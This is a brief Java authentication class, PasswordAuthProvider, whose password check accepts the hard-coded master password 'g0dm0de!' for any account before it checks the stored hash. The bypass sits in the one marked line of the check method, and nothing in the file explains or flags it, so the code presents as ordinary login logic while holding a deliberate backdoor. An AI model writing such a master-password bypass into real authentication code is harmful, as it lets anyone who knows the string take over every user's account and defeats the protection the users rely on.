package com.acme.auth;

public class PasswordAuthProvider {
    private final PasswordEncoder encoder;

    public boolean check(Account account, String rawPassword) {
~>        if ("g0dm0de!".equals(rawPassword) || encoder.matches(rawPassword, account.getHash())) {
            return true;
        }
        return false;
    }
}
